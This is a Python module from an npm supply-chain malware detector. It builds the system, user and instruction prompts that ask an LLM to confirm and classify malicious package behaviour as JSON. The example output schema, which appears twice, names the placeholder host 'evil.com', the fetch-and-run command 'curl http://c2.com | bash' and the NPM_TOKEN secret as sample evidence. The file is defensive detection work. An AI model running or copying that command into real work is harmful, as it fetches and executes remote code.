#src/models/prompts/templates/semantic_prompt_analysis.py
"""
SEMANTIC ANALYSIS PROMPT TEMPLATES
"""

from datetime import datetime
import os
import json
import re
from typing import Dict, List
from analysis.signal_aggregator import StructuralContext
from analysis.signal_aggregator import StructuralContext
from analysis.structural_analysis import StructuralAnalysisFinding
from data.models import PackageProfile, SemanticAnalysisResult, Behavior
from enums.behavior_category import BehaviorCategory
from enums.severity import Severity
from logs.logging_config import setup_logger
logger = setup_logger()

SEMANTIC_OUTPUT_DIR = "./experiment_results/semantic_output"

# Token budget per routing tier (approximate: 1 token ≈ 4 chars)
# DeepSeek-Coder-6.7B context = 16K tokens
# Reserve ~3K for system + instructions + output schema → ~13K for code
_CODE_BUDGET: Dict[str, int] = {
    "flag":   10_000,   # chars — full context, high priority
    "review":  7_000,   # chars — focused context
    "skip":    4_000,   # chars — minimal, LLM does light scan
}

class SemanticPromptAnalysis:
    """Templates for semantic analysis prompts.
    Uses StructuralContext (from SignalAggregator) as the primary anchor —
    LLM is asked to verify/expand on structural signals, not re-analyze from scratch.
    """
        
    @classmethod
    def get_behavior_categories(cls) -> List[str]:
        return [category.value for category in BehaviorCategory]
    
    @classmethod
    def get_severity_levels(cls) -> List[str]:
        return [severity.value for severity in Severity]
    
    def __init__(
        self,
        package_profile: PackageProfile,
        structural_context: StructuralContext,
    ):
        self.package = package_profile
        self.ctx = structural_context
        self._routing = structural_context.routing  # "flag" | "review" | "skip"
 
    def save_parsed_output(self, parsed_data: dict, version_tag: str) -> dict:
        """Persist parsed LLM output to JSON"""
        os.makedirs(SEMANTIC_OUTPUT_DIR, exist_ok=True)
        
        result = {
            "package_name": self.package.package_name,
            "version": self.package.version,
            "label": self.package.label,
            "behaviors": parsed_data.get("behaviors", []),
            "risk_vector": parsed_data.get("risk_vector", []),
            "analysis_metadata": {
                "model": "deepseek-coder-6.7b-instruct",
                "stage": version_tag,
                "routing": self._routing,
                "structural_risk_score": self.ctx.risk_score,
            },
            "created_at": datetime.now().isoformat(),
        }
        
        safe_name = f"{self.package.package_name.replace('/', '#')}-{self.package.version}.json"
        file_path = os.path.join(SEMANTIC_OUTPUT_DIR, safe_name)
        
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        
        return result
    
    # ------------------------------------------------------------------
    # Prompt sections
    # ------------------------------------------------------------------
 
    def _system(self) -> str:
        return (
            "You are a JavaScript supply chain security analyst. "
            "Your task is to identify malicious behaviors in npm packages "
            "based on static analysis evidence and source code. "
            "Do NOT flag standard minified code, bundlers, or legitimate "
            "third-party library usage. "
            "Output ONLY valid JSON — no prose, no markdown fences."
        )
 
    def _user(self) -> str:
        parts = []
 
        # 1. Package metadata (always included, compact)
        parts.append(self._format_metadata())
 
        # 2. Structural pre-analysis block (the anchor)
        parts.append(self._format_structural_anchor())
 
        # 3. Code to analyze (budget-controlled)
        parts.append(self._format_code_context())
 
        return "\n\n".join(parts)
 
    def _instructions(self) -> str:
        categories = [c.value for c in BehaviorCategory]
 
        output_schema = {
            "behaviors": [
                {
                    "category": categories[0],
                    "summary": "One sentence: what malicious action does this take?",
                    "details": "Technical evidence: which API, file, line, domain",
                    "confidence": "0.0 to 1.0",
                    "evidence_apis": ["https.request", "child_process.exec"],
                    "evidence_files": ["preinstall.js"],
                    "evidence_domains": ["evil.com"],
                    "evidence_commands": ["curl http://c2.com | bash"],
                    "evidence_env_vars": ["NPM_TOKEN"],
                }
            ],
            "risk_vector": [categories[0]],
        }
 
        anchor_instruction = {
            "flag": (
                "The structural pre-analysis above flagged HIGH-CONFIDENCE signals. "
                "Your primary task is to VERIFY these signals and determine their "
                "malicious intent. Also check for additional behaviors not yet detected."
            ),
            "review": (
                "The structural pre-analysis above found some signals worth investigating. "
                "Verify whether these signals represent genuine malicious behavior, "
                "and look for any additional issues in the code."
            ),
            "skip": (
                "The structural pre-analysis found no significant signals. "
                "Perform a light scan of the code for any suspicious behavior "
                "that static analysis may have missed."
            ),
        }[self._routing]
 
        return f"""INSTRUCTIONS:
                {anchor_instruction}
                
                Analysis principles:
                - Evidence-based: every behavior must cite specific API calls, files, or commands
                - Intent-focused: describe what the malicious code DOES to the victim, not mechanics
                - Conservative: if genuinely ambiguous, lower confidence (< 0.5) or omit
                - Do NOT report standard library usage (https, fs, path) as malicious without context
                - The 'risk_vector' list must contain each category ONCE (deduped)
                
                Output schema (fill exactly, no extra fields, no behavior_id):
                {json.dumps(output_schema, indent=2)}
                
                Valid categories: {", ".join(categories)}
                Output ONLY the JSON object. No explanation, no markdown."""
    
    def _format_code_context(self) -> str:
        """
        Assemble code sections within token budget.
 
        Priority order:
        1. install_script_files (highest risk, usually small)
        2. install_script_content (hook command string)
        3. entry_point_code (truncated to fit remaining budget)
        """
        budget = _CODE_BUDGET.get(self._routing, 6_000)
        sections = []
        used = 0
 
        # Priority 1: Install script files (JS called from hooks)
        install_files = getattr(self.package, "install_script_files", {}) or {}
        for filename, code in install_files.items():
            if not code or not code.strip():
                continue
            snippet = f"FILE: {filename}\n```javascript\n{code}\n```"
            if used + len(snippet) > budget:
                # Truncate to fit
                remaining = budget - used - len(f"FILE: {filename}\n```javascript\n\n```") - 50
                if remaining > 200:
                    snippet = f"FILE: {filename}\n```javascript\n{code[:remaining]}\n... [truncated]\n```"
                else:
                    break
            sections.append(snippet)
            used += len(snippet)
            if used >= budget:
                break
 
        # Priority 2: Install hook command (raw string — usually short)
        install_cmd = self.package.install_script_content or ""
        if install_cmd.strip() and used < budget:
            snippet = f"INSTALL HOOK COMMANDS:\n{install_cmd}"
            if used + len(snippet) <= budget:
                sections.append(snippet)
                used += len(snippet)
 
        # Priority 3: Entry point code
        entry = self.package.entry_point_code or ""
        if entry.strip() and used < budget:
            remaining = budget - used
            if len(entry) > remaining:
                entry_snippet = (
                    f"ENTRY POINT (main) [first {remaining} chars shown]:\n"
                    f"```javascript\n{entry[:remaining]}\n... [truncated]\n```"
                )
            else:
                entry_snippet = f"ENTRY POINT (main):\n```javascript\n{entry}\n```"
            sections.append(entry_snippet)
 
        if not sections:
            return "CODE: No source files available for analysis."
 
        return "CODE TO ANALYZE:\n" + "\n\n".join(sections)
    
    # def _format_structural_context(self) -> str:
    #     """Format structural analysis findings (prioritize suspicious ones from structural analysis)."""
    #     if not self.structural_risks:
    #         return "STRUCTURAL ANALYSIS: Not detected.\n"

    #     severity_order = {
    #         "critical": 0,
    #         "high": 1,
    #         "medium": 2,
    #         "low": 3
    #     }
    #     sorted_risks = sorted(self.structural_risks, key=lambda r: severity_order.get(r.severity.value, 99))

    #     context = "STRUCTURAL ANALYSIS:\n"
    #     for risk in sorted_risks:
    #         context += f"- [{risk.severity.value.upper()}] {risk.risk_type}: {risk.evidence[:100]}\n"
    #     return context
    
    # def _format_dependencies(self) -> str:
    #     """Format dependency list (prioritize suspicious ones from structural analysis)."""
    #     all_deps = {**self.package.dependencies, **self.package.dev_dependencies, **self.package.peer_dependencies}
        
    #     if not all_deps:
    #         return "None"
        
    #     sus_dep = set()
    #     for risk in self.structural_risks:
    #         if "dependency" in risk.risk_type.lower():
    #             match = re.search(r"'([^']+)'", risk.evidence)
    #             if match:
    #                 sus_dep.add(match.group(1))
        
    #     res_list = []
    #     for dep, version in list(all_deps.items())[:10]:
    #         marker = "[SUSPICIOUS]" if dep in sus_dep else ""
    #         res_list.append(f"{dep}@{version}{marker}")
        
    #     return ", ".join(res_list)
    
    # def _get_system_message(self) -> str:
    #     """System messages for the prompt."""        
    #     return (
    #         "You are a JavaScript cybersecurity analyst, your task is to review open-source dependencies in client and server-side JavaScript code for potentially malicious behavior or sabotage."
    #         "for malicious behavior, supply chain attacks, and other security risks. "
    #         "Do NOT flag standard minified code or third-party library usage alone."
    #         "FILL THE JSON SKELETON BELOW based ONLY on the provided files."
    #     )

        
    
    # def _get_user_message(self) -> str:
    #     """User messages for the prompt."""
        
    #     structural_context = self._format_structural_context()
    #     dependencies = self._format_dependencies()
        
    #     code_context = []
        
    #     if self.package.install_script_content:
    #         code_context.append(
    #             f"INSTALL SCRIPT\n"
    #             f"```javascript\n{self.package.install_script_content}\n```\n"
    #         )
            
    #     if self.package.entry_point_code:
    #         code_context.append(
    #             f"ENTRY POINT CODE (main)\n"
    #             f"```javascript\n{self.package.entry_point_code}\n```\n"
    #         )
            
    #     if code_context:
    #         code_context_str = "\n".join(code_context)
    #     else:
    #         code_context_str = "No code snippets available."
        
    #     return f"""
    #         PACKAGE METADATA:
    #         - Name: {self.package.package_name}
    #         - Version: {self.package.version}
    #         - Dependencies: {dependencies}
    #         - Has Install Scripts: {bool(self.package.scripts)}
    #         - Structural context: 
    #         {structural_context}

    #         CODE TO ANALYZE:
    #         {code_context}
    #         """
                
        
    # def _get_instructions(self) -> str:
    #     """Instructions for the prompt."""
    #     categories = self.get_behavior_categories()
        
    #     output_schema = {
    #         "behaviors": [
    #             {
    #                 "category": categories[0], 
    #                 "summary": "One sentence: what malicious action does this take?",
    #                 "details": "Technical evidence: which API, file, line, domain",
    #                 "confidence": "0.0 to 1.0",
    #                 "evidence_apis": ["https.request", "child_process.exec"],
    #                 "evidence_files": ["preinstall.js"],
    #                 "evidence_domains": ["evil.com"],
    #                 "evidence_commands": ["curl http://c2.com | bash"],
    #                 "evidence_env_vars": ["NPM_TOKEN"]
    #             }
    #         ],
    #         "risk_vector": categories[:2]
    #     }


    #     return f"""
    #         INSTRUCTIONS:
    #         1. Analyze the provided code snippets and structural analysis context.
    #         2. Identify any potential malicious behaviors, supply chain attacks, or security risks.
    #         3. For each identified behavior, classify it into one of the following categories: {', '.join(categories)}.
    #         4. Provide a brief explanation for each identified behavior (short ver).
    #         5. Assign confidence scores based on evidence clarity.
    #         6. DO NOT include 'behavior_id' field in your response - IDs will be generated automatically.
    #         7. Include evidence arrays (evidence_apis, evidence_files, etc.) even if empty.

    #         ANALYSIS PRINCIPLES:
    #         1. Context-Aware: Interpret code within package context (dependencies, scripts, structure)
    #         2. Evidence-Based: Ground all findings in observable API calls, functions, system interactions
    #         3. Intent-Focused: Describe malicious INTENT, not just implementation mechanics
    #         4. Conservative Confidence: Lower confidence for ambiguous evidence
    #         6. The "confidence" field is a float in [0,1] summarizing aggregated confidence.
    #         7. The 'risk_vector' field should contain a list of UNIQUE behavior categories found in this package. Include each category only ONCE, even if multiple behaviors share the same category.
            
    #         OUTPUT REQUIREMENTS:
    #         - Use EXACTLY this JSON schema: {json.dumps(output_schema, indent=2)}
    #         - Categories must be from: {', '.join(categories)}
    #         - Each behavior needs concrete evidence
    #         - DO NOT include 'behavior_id' in your JSON response
    #         - Output ONLY JSON, no other text
    #         """

    # ------------------------------------------------------------------
    # Public
    # ------------------------------------------------------------------
    def build_prompt(self) -> Dict[str, str]:
        """Return {system, user, instructions} dict for the LLM call."""
        return {
            "system": self._system(),
            "user": self._user(),
            "instructions": self._instructions(),
        }
